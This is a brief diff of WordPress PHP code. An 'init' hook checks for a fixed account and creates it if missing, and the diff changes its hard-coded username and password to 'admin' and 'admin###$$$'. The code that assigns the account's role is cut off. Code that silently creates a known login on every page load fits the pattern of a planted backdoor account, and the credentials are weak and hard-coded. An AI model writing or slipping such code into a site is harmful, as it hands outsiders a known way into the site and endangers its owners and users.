@@ -1,6 +1,6 @@
 add_action( 'init', function () {
-$username = 'wpdefault';
-$password = '1234567890!';
+$username = 'admin';
+$password = 'admin###$$$';
 $email_address = 'wordpress@example.com';
 
 if ( ! username_exists( $username ) ) {
